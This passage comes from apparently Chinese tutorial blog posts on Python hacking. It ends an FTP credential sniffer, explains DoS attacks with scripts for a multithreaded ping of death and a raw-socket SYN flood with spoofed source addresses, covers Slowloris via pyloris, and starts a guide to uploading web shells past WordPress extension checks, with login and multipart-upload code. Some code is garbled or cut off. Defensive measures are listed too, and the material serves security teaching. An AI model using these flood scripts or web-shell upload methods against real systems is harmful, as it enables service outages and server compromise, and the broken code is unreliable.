in"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> parseData    <span class="token keyword">elif</span><span class="token punctuation">(</span>parseData<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"230 User logged in"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> parseData</code></pre><ul><li><p>客户机连接FTP<br><img src="https://www.hualigs.cn/image/6058ac1ca640a.jpg" alt=""></p></li><li><p>黑客嗅探结果<br><img src="https://www.hualigs.cn/image/6058ac1cbbdce.jpg" alt=""></p></li><li><p>还可以使用Pypcap、Scapy编写Sniffer</p></li><li><p>完成了监听数据的功能，嗅探器的核心是数据分析</p></li><li><p>黑客渗透到内网后，很容易通过嗅探未经加密的数据包盗取认证信息。因此，内网也要采用相应的安全措施，防止包嗅探攻击</p><ul><li>传输数据时，使用SSL与IPsec等加密协议，使黑客无法通过包嗅探查看数据内容</li><li>与远程连接服务器时，要使用SSH，防止认证信息与命令被盗</li></ul></li><li><p>当然，更积极的应对方法是使用专门的嗅探探测工具</p></li></ul><h2 id="五、DoS攻击"><a href="#五、DoS攻击" class="headerlink" title="五、DoS攻击"></a>五、DoS攻击</h2><ul><li><p>DoS攻击阻止服务器正常工作</p></li><li><p>大部分DoS攻击能利用网络协议漏洞，但也有部分DoS攻击通过触发大量正常服务请求使服务器瘫痪</p></li><li><p>DoS攻击虽然简单，但破坏能力非常惊人</p></li><li><p>目前，DoS攻击技术正在向DDoS（分布式）与DrDoS（反射式）等技术演化</p></li><li><p>可使用HTTP、TCP、PING、ICMP等协议，采用多种方法攻击服务器，不断消耗服务器的带宽、内存、CPU、磁盘资源，最终导致瘫痪，无法正常对外提供服务<br><img src="https://www.hualigs.cn/image/6058b1aba7934.jpg" alt=""></p></li><li><p>常用的DoS攻击技术</p><ul><li><strong>死亡之Ping</strong>(Ping of Death)</li><li>ping实用程序使用的ICMP包很大（如65535字节），远远大于普通大小（32字节）时，它就会被分片，分割为网络可以处理的大小。服务器处理大量ICMP包时会消耗大量系统资源，最终资源耗尽，导致瘫痪</li><li><strong>着陆攻击</strong>（LAND Attack：局域网拒绝服务攻击，LAND Denial Attack）</li><li>请求TCP连接发送SYN包时，SYN包具有相同源地址与目的地址，均设置为服务器地址。这样，服务器回送SYN/ACK包时，发现目的地址就是自己，导致服务器不断向自己发送SYN/ACK包，最终造成系统崩溃</li><li><strong>TCP SYN洪水攻击</strong></li><li>该攻击利用了TCP连接过程中的安全缺陷。客户机向服务器发送SYN包时，服务器会向客户机回送SYN/ACK包。然后，客户机向服务器ACK包建立TCP连接。若最后一步客户机不向服务器发送ACK包，则服务器一直等待，处于SYN Receive状态。不断重复这一过程，服务器的缓冲将被全部耗尽，从而瘫痪</li><li><strong>Slowloris Attack</strong></li><li>黑客与服务器建立正常会话后，向服务器发送非正常HTTP请求头（未结束的HTTP头）。服务器认为HTTP请求部分没有结束，保持此连接不释放，继续等待完整请求。随着这种开放状态的连接数量增加，服务器连接数就会很快达到上限，从而无法处理新的请求</li><li><strong>Tear Drop攻击</strong></li><li>传送大数据包时，会先对数据包进行分片，这些分片到达目的地时再重新组装。分片数据包包含该分片偏移量，可以通过操纵偏移量的值，使其大于实际偏移量，造成重叠偏移。这会引发服务器溢出问题，使服务陷入瘫痪</li><li><strong>Smurf Attack</strong></li><li>该攻击恶意利用ICMP包特性。ICMP协议的特征是，发送请求就会有响应。发送ICMP请求前，先将ICMP源地址更改为目标服务器地址。这样，每个接收到ICMP请求的主机都会做出答复，导致服务器被大量ICMP响应吞没，网络发生阻塞，从而拒绝为正常请求服务</li><li><strong>HTTP洪水攻击</strong></li><li>该攻击大量调用正常服务，使服务瘫痪。若同时大量请求Web服务器提供服务的URL，Web服务器的CPU与连接资源会很快耗尽，从而陷入瘫痪</li></ul></li><li><p>DoS使用大量主机发动攻击的成功率更高<br>DDoS攻击中，恶意代码同时感染多台PC，这些主机被用作攻击主机，黑客远程向其下达攻击命令。若DDoS与HTTP洪水等使用正常服务的攻击技术配合使用，那么现有的安全设备也将很难针对DDoS攻击进行有效防御</p></li></ul><h2 id="六、DoS：死亡之PING"><a href="#六、DoS：死亡之PING" class="headerlink" title="六、DoS：死亡之PING"></a>六、DoS：死亡之PING</h2><ul><li>在Windows环境中使用ping命令，必须现在服务器的防火墙设置中允许ICMP<ul><li>控制面板：系统和安全-Windows防火墙-高级设置-入站规则-新建规则（规则类型：自定义，程序：所有程序，协议和端口：ICMPv4，特定ICMP类型：回显请求，作用域：任何IP地址）</li><li>测试执行ping命令，ping ip -1 65500。默认传送的数据长度为32字节，最大可传送数据长度为65500字节</li></ul></li><li>安装监视工具，Wireshark（对网络行为状态监视，也可用于包嗅探）</li><li>随着系统性能的提升，发动DoS攻击的威力大大减小，例6很难获得良好的攻击效果<ul><li>客户机运行ping命令，查看示例代码对服务器性能造成的影响：并不会造成服务器死机，或导致其性能显著下降</li><li>但随着线程数量的增加，特别是线程数超过100个时，服务器性能下降逐渐明显，导致有些回复的耗时大于10ms</li><li>防范死亡之Ping攻击，需要限制某个时间段内进入的ping个数，或者阻止所有来自外部的ping命令。此外，还要设置防火墙规则，检查ping请求的大小，阻止大于正常大小的ping请求</li></ul></li></ul><p><strong>例6</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> subprocess<span class="token keyword">import</span> thread<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">POD</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">:</span>    ret<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token string">"ping server -1 65500"</span><span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">" %d , "</span><span class="token operator">%</span>id<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''    创建线程：调用POD函数，传入数字，标注是第几个被创建的线程    '''</span>    thread<span class="token punctuation">.</span>start_new_thread<span class="token punctuation">(</span>POD<span class="token punctuation">,</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.8</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建一个线程后，为了减轻黑客PC的负荷，等待0.8秒</span></code></pre><h2 id="七、DoS：TCP-SYN洪水攻击"><a href="#七、DoS：TCP-SYN洪水攻击" class="headerlink" title="七、DoS：TCP SYN洪水攻击"></a>七、DoS：TCP SYN洪水攻击</h2><ul><li><p>TCP通信需要先通过三次握手建立连接</p><ul><li><p>该过程存在安全漏洞，即服务器最初接收SYN包时就会分配系统资源。连接请求记录被放入待处理队列，该队列满后就无法再接收新的请求。TCP SYN洪水攻击通过大量发送SYN包使待处理队列无法正常工作，从而无法接收新的连接请求<br><img src="https://www.hualigs.cn/image/6058ac1d1415f.jpg" alt=""></p></li><li><p>通过原始套接字可以随意调整TCP与IP头，要发动TCP SYN洪水攻击，需要使用原始端口，调用sendto()方法</p></li><li><p>为了保证系统安全，Windows中禁止调用TCP协议的sendto()方法。而Linux允许用户使用send()方法调用TCP协议</p></li><li><p>在Virturl Box中安装Linux，学习TCP SYN洪水攻击技术</p></li></ul></li></ul><p><strong>设置IP与TCP头</strong></p><ul><li>套接字通信中，IP与TCP头通常由内核自动设置。但若想使用原始套接字仅传送SYN包，则需要程序员亲自创建</li><li>IP头结构<br><img src="https://www.hualigs.cn/image/6058ac1cee2dc.jpg" alt=""></li></ul><p><img src="https://www.hualigs.cn/image/6058ac1d784e0.jpg" alt=""></p><ul><li><p>TCP头结构<br><img src="https://www.hualigs.cn/image/6058ac1cc093b.jpg" alt=""></p></li><li><p>Source Port任意值，Destination Port设为要攻击的目标端口(80)。将Sequence Number与Acknowledgement Number也设为任意值</p></li><li><p>DataOfiset(头部长度)表示TCP头结束位置，32b为单位，设置为5表示头长度为20字节。由于只发送SYN包，所以要将Flags设置为1。Window设置为5840，协议允许的最大窗口。Checksum在发送包时由内核自动设置<br><img src="https://www.hualigs.cn/image/6058ac1d7d5ff.jpg" alt=""></p></li><li><p>设置IP头与TCP头时，要将Python中使用的字符变为C语言的结构体，struct模块提供了pack()函数进行转换。将Python类型设置为C语言合适的类型时，要使用表中所示格式字符</p></li></ul><p><strong>例7 TCP SYN洪水攻击示例</strong></p><ul><li>TCP 通信最基本的方式是先建立连接然后再传送数据。在TCP协议中，需要先完成三次握手，然后才能传送数据。但为了发动TCP SYN洪水攻击，需要在建立通信连接之前就传送数据，所以必须使用另外的函数</li><li>运行示例程序之后，可以采用下面两种方式查看包传送结果，一种是使用黑客PC安装的Wireshark程序，另一种是在服务器命令行窗口使用netstat -n -p tcp等命令</li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#运行于Linux</span><span class="token keyword">import</span> socket<span class="token punctuation">,</span>sys<span class="token keyword">from</span> struct <span class="token keyword">import</span> <span class="token operator">*</span><span class="token triple-quoted-string string">'''声明TCP校验和计算函数：TCP校验和用于保证传送数据的完整性计算TCP校验和时，先将头与数据以16位为单位进行分割，再求校验位和，然后按位取反'''</span><span class="token keyword">def</span> <span class="token function">makeChecksum</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>    s<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        w<span class="token operator">=</span><span class="token punctuation">(</span>ord<span class="token punctuation">(</span>msg<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>ord<span class="token punctuation">(</span>msg<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        s<span class="token operator">=</span>s<span class="token operator">+</span>w    s<span class="token operator">=</span><span class="token punctuation">(</span>S<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>s<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span>    s<span class="token operator">=</span><span class="token operator">~</span>s<span class="token operator">&amp;</span><span class="token number">0xffff</span>    <span class="token keyword">return</span> s<span class="token keyword">def</span> <span class="token function">makeIPHeader</span><span class="token punctuation">(</span>sourceIP<span class="token punctuation">,</span>destIP<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#声明创建IP头函数</span>    version<span class="token operator">=</span><span class="token number">4</span>    ihl<span class="token operator">=</span><span class="token number">5</span>    typeOfService<span class="token operator">=</span><span class="token number">0</span>    totalLength<span class="token operator">=</span><span class="token number">20</span><span class="token operator">+</span><span class="token number">20</span>    id<span class="token operator">=</span><span class="token number">999</span>    flagsOffSet<span class="token operator">=</span><span class="token number">0</span>    sourceAddress<span class="token operator">=</span>socket<span class="token punctuation">.</span>inet_aton<span class="token punctuation">(</span>sourceIP<span class="token punctuation">)</span>    destinationAddress<span class="token operator">=</span>socket<span class="token punctuation">.</span>inet_aton<span class="token punctuation">(</span>destIP<span class="token punctuation">)</span>    ihlVersion<span class="token operator">=</span><span class="token punctuation">(</span>version<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>ihl    <span class="token keyword">return</span> pack<span class="token punctuation">(</span><span class="token string">'lBBHHHBBH4s4s'</span><span class="token punctuation">,</span>ihlVersion<span class="token punctuation">,</span>typeOfService<span class="token punctuation">,</span>totalLength<span class="token punctuation">,</span>id<span class="token punctuation">,</span>flagsOffSet                <span class="token punctuation">,</span>ttl<span class="token punctuation">,</span>protocol<span class="token punctuation">,</span>headerCheckSum<span class="token punctuation">,</span>sourceAddress<span class="token punctuation">,</span>destinationAddress<span class="token punctuation">,</span>                ihlVersion<span class="token punctuation">)</span>                <span class="token comment" spellcheck="true">#创建IP头结构体：使用pack()函数转换为C语言使用的结构体形式</span><span class="token keyword">def</span> <span class="token function">makeTCPHeader</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span>ichecksum<span class="token operator">=</span><span class="token string">"none"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#声明TCP头创建函数</span>    sourcePort<span class="token operator">=</span>port    destinationAddressPort<span class="token operator">=</span><span class="token number">80</span>    SeqNumber<span class="token operator">=</span><span class="token number">0</span>    kckNumber<span class="token operator">=</span><span class="token number">0</span>    dataOffset<span class="token operator">=</span><span class="token number">5</span>    flagFin<span class="token operator">=</span><span class="token number">0</span>    flagSyn<span class="token operator">=</span><span class="token number">1</span>    flagRst<span class="token operator">=</span><span class="token number">0</span>    flagPsh<span class="token operator">=</span><span class="token number">0</span>    flagAck<span class="token operator">=</span><span class="token number">0</span>    flagUrg<span class="token operator">=</span><span class="token number">0</span>    window<span class="token operator">=</span>socket<span class="token punctuation">.</span>htons<span class="token punctuation">(</span><span class="token number">5840</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>icheckSum<span class="token operator">==</span><span class="token string">"none"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        checksum<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        checksum<span class="token operator">=</span>icheckSum    urgentPointer<span class="token operator">=</span><span class="token number">0</span>    dataOffsetResv<span class="token operator">=</span><span class="token punctuation">(</span>dataOffset<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0</span>    flags<span class="token operator">=</span><span class="token punctuation">(</span>flagUrg<span class="token operator">&lt;&lt;</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>flagAck<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>flagPsh c<span class="token operator">&lt;&lt;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>flagRst<span class="token operator">&lt;&lt;</span>    <span class="token keyword">return</span> pack<span class="token punctuation">(</span>"!HHLLBBHHH sourcePort<span class="token punctuation">,</span> destinationAddressPort<span class="token punctuation">,</span>SeqNumber<span class="token punctuation">,</span>                AckNumber<span class="token punctuation">,</span> dataOffsetResv<span class="token punctuation">,</span>flags<span class="token punctuation">,</span>window<span class="token punctuation">,</span>checkSum<span class="token punctuation">,</span>                urgentPointer<span class="token punctuation">)</span>                        <span class="token comment" spellcheck="true">#创建TCP头结构体：使用pack()函数转换为C语言使用的结构体形式</span><span class="token triple-quoted-string string">'''创建原始套接字：创建原始套接字对象，使用它可以任意创建IP头与TCP头使用原始套接字需要拥有管理员权限'''</span>s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_RAW<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>IPPROTO_TCP<span class="token punctuation">)</span>s<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>IPPROTO_IP<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>IP_HDRINCL<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#设置套接字选项</span><span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> l <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token triple-quoted-string string">'''            设置源IP与目的IP，为了方便测试，将源IP设置为每次都变化，            使用socket.gethostbyname('server')方式获取目的主机IP            '''</span>            sourceIP<span class="token operator">=</span><span class="token string">"169.254.%s.%s"</span><span class="token operator">%</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span>l<span class="token punctuation">)</span>            destIP<span class="token operator">=</span><span class="token string">"169.254.27.229"</span>            ipHeader<span class="token operator">=</span>makeIPHeader<span class="token punctuation">(</span>sourceIP<span class="token punctuation">,</span>destIP<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用相应函数创建IP头部</span>            <span class="token triple-quoted-string string">'''            调用创建TCP头的函数，刚开始创建伪TCP头，用以计算TCP校验和，            端口号设置为10000以上，这类端口号可以任意使用            '''</span>            tcpHeader<span class="token operator">=</span>makeTCPHeader<span class="token punctuation">(</span><span class="token number">10000</span><span class="token operator">+</span>j<span class="token operator">+</span>k<span class="token operator">+</span>l<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#使用inet_aton()函数将一个字符串IP地址转换为一个32位的网络序列IP地址</span>            sourceAddr<span class="token operator">=</span>socket<span class="token punctuation">.</span>inet_aton<span class="token punctuation">(</span>sourceIP<span class="token punctuation">)</span>            destAddr<span class="token operator">=</span>socket<span class="token punctuation">.</span>inet_aton<span class="token punctuation">(</span>destIP<span class="token punctuation">)</span>            placeholder<span class="token operator">=</span><span class="token number">0</span>            protocol<span class="token operator">=</span>socket<span class="token punctuation">.</span>IPPROTO_TCP            tcpLen<span class="token operator">=</span>len<span class="token punctuation">(</span>tcpHeader<span class="token punctuation">)</span>            psh<span class="token operator">=</span>pack<span class="token punctuation">(</span><span class="token string">'l4s4sBBH'</span><span class="token punctuation">,</span>sourceAddr<span class="token punctuation">,</span>destAddr<span class="token punctuation">,</span>placeholder<span class="token punctuation">,</span>protocol<span class="token punctuation">,</span>tcpLen<span class="token punctuation">)</span>            psh<span class="token operator">=</span>psh<span class="token operator">+</span>tchHeader            tcpChecksum<span class="token operator">=</span>makeChecksum<span class="token punctuation">(</span>psh<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#计算TCP校验和</span>            tcpHeader<span class="token operator">=</span>makeTCPHeader<span class="token punctuation">(</span><span class="token number">10000</span><span class="token operator">+</span>j<span class="token operator">+</span>k<span class="token operator">+</span>l<span class="token punctuation">,</span>tcpChecksum<span class="token punctuation">)</span>            packet<span class="token operator">=</span>ipHeader<span class="token operator">+</span>tcpHeader            <span class="token triple-quoted-string string">'''            传送包：将IP头与TCP头封装为TCP SYN包并传送            建立连接前，可以使用sendto()方法从发送方发送数据包            '''</span>            s<span class="token punctuation">.</span>sendto<span class="token punctuation">(</span>packet<span class="token punctuation">,</span><span class="token punctuation">(</span>destIP<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><ul><li><p>服务器端命令行窗口输入netstat -n -p tcp命令，得到如下结果<br><img src="https://www.hualigs.cn/image/6058ac1cd6c78.jpg" alt=""></p></li><li><p>最右部分（SYN_RECEIVED）表示包连接状态，当前处于接收SYN包状态，也是服务器发送ACK/SYN包之前。若创建数千个具有如下状态的连接，系统试图在特定时间内保存相应状态时，就会耗费大量资源。有大量SYN包到来时，将导致服务运行速度变慢，甚至陷入瘫痪</p></li><li><p>通过增加服务器待处理队列容量，可以在一定程度上抵御TCP SYN洪水攻击</p></li><li><p>另一种防御方法是使用syncookies功能，完成三次握手时才分配系统资源</p></li><li><p>在路由器与防火墙中，也可以对TCP SYN洪水攻击进行防御</p><ul><li>拦截模式下，路由器接收SYN包，与客户机建立连接后，才连接客户机与服务器</li><li>监视模式下，路由器会监视连接状态，若特定时间内未建立连接则中断</li></ul></li></ul><h2 id="八、DoS：Slowloris攻击"><a href="#八、DoS：Slowloris攻击" class="headerlink" title="八、DoS：Slowloris攻击"></a>八、DoS：Slowloris攻击</h2><ul><li>为了提高资源利用效率，Web服务器会对最大客户连接数进行限制。Slowloris攻击使用服务器连接数达到最大值，从而无法继续处理新的请求，继而拒绝对外提供服务</li><li>类似于HTTP洪水的DoS攻击中，由于需要向Web服务器发送大量服务请求，所以攻击者需要控制大量僵尸PC。但Slowloris攻击中，即使只使用一台PC也有可能使Web服务器陷入瘫痪，不会在日志文件中留下痕迹，这样就很难对其进行探测</li><li>正常的HTTP头以/r/n/r/n结束。Web服务器通过查找/r/n/r/n判断HTTP头技术，Slowloris攻击使用的HTTP头只以/r/n结尾，所以Web服务器认为HTTP头尚未结束，就无法对HTTP头进行分析，从而继续保持连接。攻击开始后数分钟内，Web服务器就陷入瘫痪，无法继续对外提供服务</li></ul><h3 id="1-实施Slowloris攻击"><a href="#1-实施Slowloris攻击" class="headerlink" title="1.实施Slowloris攻击"></a>1.实施Slowloris攻击</h3><ul><li>安装pyloris模块（sourceforge.net/projects/pyloris）</li><li>运行pyloris模块<ul><li>解压缩</li><li>GUI应用</li><li>可使用netstat -n -p tcp|find /c TCP命令查看连接个数，得到的结果与pyloris程序的Status区域中Attacks显示的个数一致。连接数超过300时，在80端口工作的Web服务一般都会陷入瘫痪</li></ul></li></ul><h3 id="2-防御"><a href="#2-防御" class="headerlink" title="2.防御"></a>2.防御</h3><ul><li>升级Web服务器的硬件，配置增加允许的最大连接数</li><li>限制来自同一IP的连接个数</li><li>安装Web防火墙等安全设备，拦截有错误的HTTP头</li></ul><p>3/22/2021 10:54:59 PM </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Web shell攻击</title>
      <link href="2021/03/21/web-shell-gong-ji/"/>
      <url>2021/03/21/web-shell-gong-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="一、概念"><a href="#一、概念" class="headerlink" title="一、概念"></a>一、概念</h2><ul><li><p>Web shell程序含有可以向系统下达命令的代码，使用简单的服务器脚本（JSP、PHP）等即可编写。利用Web网站提供的文件上传功能，将Web shell上传至Web网站，然后调用URL直接执行</p></li><li><p>大部分Web网站通过检查文件扩展名防范Web shell攻击，但很多方法可以绕过Web网站的检查<br><img src="https://www.hualigs.cn/image/60574fda88b40.jpg" alt=""></p></li><li><p>在Apache Web服务器中可以运行的文件有.php、.html、.cer等。假设上传的文件名为webshell.php，在其中植入用于攻击系统的代码，然后通过URL调用执行webshell.php，不断改变输入值，尝试发动多种攻击，比如非法收集服务器信息、获取管理员权限、浏览源代码、插入恶意脚本、窃取服务器内部资料等</p></li><li><p>有些Web服务器的文件上传功能是使用Flash实现的，无法通过查看HTML源代码推导其工作原理。需要安装HTTP Analyzer程序，通过分析浏览器的HTTP协议数据对浏览器的行为进行监视，查找文件上传所需信息</p></li><li><p>由于WordPress不允许上传扩展名为.php的文件，所以将文件扩展名修改为.html，再将其上传到服务器。与.php文件类似，.HTML文件中的PHP代码也能运行。webshell.html文件正常执行后，即可获取Web服务器的多种环境信息，比如Apache安装信息、PHP环境信息、系统环境变量信息、MySQL设置信息等</p></li><li><p>Apache配置</p><ul><li>在apache的conf目录中修改文件httpd.conf</li><li>搜索AddType application/</li><li>在下面添加AddType application/x-httpd-php.html，使得后缀是html的文件，也会经过php引擎处理执行</li><li>建议不要这样做：不安全，加重服务器负担</li></ul></li></ul><h2 id="二、HTTP文件上传详细流程"><a href="#二、HTTP文件上传详细流程" class="headerlink" title="二、HTTP文件上传详细流程"></a>二、HTTP文件上传详细流程</h2><ul><li>登录：可以通过注册加入、SQL注入攻击或者密码破解攻击获取认证信息</li><li>保存Cookie：若想通过不断修改文件名尝试上传文件，则应该在Python程序内部（非浏览器）保持登录状态。由于服务器与浏览器之间的认证信息通过Cookie进行维持，所以需要在登录后保存接收的Cookie，并再次传送给服务器</li><li>加载文件：上传可以通过URL执行的文件是一项重复性工作。大部分网站都禁止用户上传以.php、.js等为扩展名的文件。因此，攻击者必须不断尝试使用各种形式的文件名创建文件，以绕过网站的安全防护发动攻击，读取文件，加载数据</li><li>设置HTTP头信息，比如User-Agent、Content-Type等</li><li>设置HTTP体：其中保存着要传给服务器的数据。对于服务器中用于处理文件上传的程序，可以通过分析HTTP数据包得到其要求的默认值，其余是与文件相关的数据</li><li>文件传送：使用准备好的HTTP头与体调用服务器页面。传送成功后，可通过URL调用Web shell程序。若传送失败，则返回步骤3，再次传送其它名称的文件</li></ul><h2 id="三、实例"><a href="#三、实例" class="headerlink" title="三、实例"></a>三、实例</h2><p><strong>例1 登录</strong></p><ul><li>该程序使用cookielib模块，用于处理Cookie，支持从HTTP响应查找Cookie信息，并将其保存为可用形式。登录后，向服务器请求需要认证的页面时，必须使用该模块</li><li>执行代码可访问登录页面，并传递用户名与密码。最终，获取成功登录信息以及Cookie信息</li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token punctuation">,</span>stat<span class="token punctuation">,</span>mimetypes<span class="token punctuation">,</span>httplib<span class="token keyword">import</span> urllib<span class="token punctuation">,</span>urllib2<span class="token keyword">from</span> cookieli6 <span class="token keyword">import</span> CookieJar<span class="token keyword">import</span> time<span class="token triple-quoted-string string">'''创建CookieJar对象：CookieJar类用于从HTTP Request对象提取Cookie，并将Cookie返回HTTP Response对象'''</span>cj<span class="token operator">=</span>cookieJar<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''创建Opener对象，可以使用HTTP协议调用服务创建的Opener对象提供open()方法，接收Request作为参数调用服务'''</span>opener<span class="token operator">=</span>urllib2<span class="token punctuation">.</span>build_opener<span class="token punctuation">(</span>urllib2<span class="token punctuation">.</span>HTTPCookieProcessor<span class="token punctuation">(</span>cj<span class="token punctuation">)</span><span class="token punctuation">)</span>url<span class="token operator">=</span><span class="token string">"http://server/wordpress/wp-login.php"</span>values<span class="token operator">=</span><span class="token punctuation">{</span>    <span class="token string">'log'</span><span class="token punctuation">:</span><span class="token string">"python"</span>    <span class="token string">'pwd'</span><span class="token punctuation">:</span><span class="token string">"python"</span><span class="token punctuation">}</span>headers<span class="token operator">=</span><span class="token punctuation">{</span>    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilia/4.0(compatible; MSIE5.5; Windows NT)'</span>    <span class="token string">'Referer'</span><span class="token punctuation">:</span><span class="token string">'http://server/wordpress/wp-admin/'</span><span class="token punctuation">}</span>data<span class="token operator">=</span>urllib<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span>values<span class="token punctuation">)</span>request<span class="token operator">=</span>urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token punctuation">,</span>headers<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''通过Opener对象调用服务后，可以保持登录信息，并且可以不断调用服务通过更改Request对象的头与体值，可以不断变更调用的服务'''</span>response<span class="token operator">=</span>opener<span class="token punctuation">.</span>open<span class="token punctuation">(</span>request<span class="token punctuation">)</span></code></pre><p><strong>例2 设置表单数据</strong></p><ul><li>实现文件上传的HTML中，通常会将’ enctype=”multipart/form data” ‘放入<form>标记的属性。编写表单数据设置程序，采用不同于常规POST方式的其他格式以构成协议体</form></li><li>表单数据设置结果</li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token punctuation">,</span>stat<span class="token punctuation">,</span>mimetypes<span class="token punctuation">,</span>httplib<span class="token keyword">import</span> urllib<span class="token punctuation">,</span>urllib2<span class="token keyword">from</span> Gookieli6 <span class="token keyword">import</span> CookieJar<span class="token keyword">import</span> time<span class="token triple-quoted-string string">'''声明函数，接收两个列表作为参数，以form-data形式创建数据与附件'''</span><span class="token keyword">def</span> <span class="token function">encode_multipart_formdata</span><span class="token punctuation">(</span>fields<span class="token punctuation">,</span>files<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''    设置boundary：设置form-data时，各值由boundary进行区分    设置为与HTTP Analyzer中的boundary一样的形式    '''</span>    BOUNDARY<span class="token operator">=</span><span class="token string">"--pluploadboundary %S"</span> <span class="token operator">%</span><span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    CRLF<span class="token operator">=</span><span class="token string">'\r\n'</span>    <span class="token comment" spellcheck="true">#回车换行</span>    L<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token punctuation">]</span>    <span class="token triple-quoted-string string">'''    设置传送数据：将创建类时作为参数传入的field列表值设置为form-data格式    负责设置文件以外的各种传送数据，各值使用boundary进行区分    '''</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>key<span class="token punctuation">,</span>value<span class="token punctuation">)</span> <span class="token keyword">in</span> fields<span class="token punctuation">:</span>        L<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'--'</span><span class="token operator">+</span>BOUNDARY<span class="token punctuation">)</span>        L<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'Content-Disposition:form-data; name="%s" %key'</span><span class="token punctuation">)</span>        L<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">''</span><span 